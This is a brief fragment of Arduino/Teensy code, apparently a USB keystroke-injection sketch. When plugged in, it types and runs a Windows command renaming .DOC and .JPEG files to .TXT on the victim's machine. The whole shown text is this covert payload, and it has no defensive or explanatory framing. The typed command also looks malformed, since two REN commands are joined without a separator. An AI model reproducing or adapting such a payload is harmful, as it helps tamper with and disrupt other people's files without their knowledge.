...
void setup()
{
  ...
  delay(1000);
  Keyboard.print("REN *.DOC *.TXT REN *.JPEG *.TXT");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
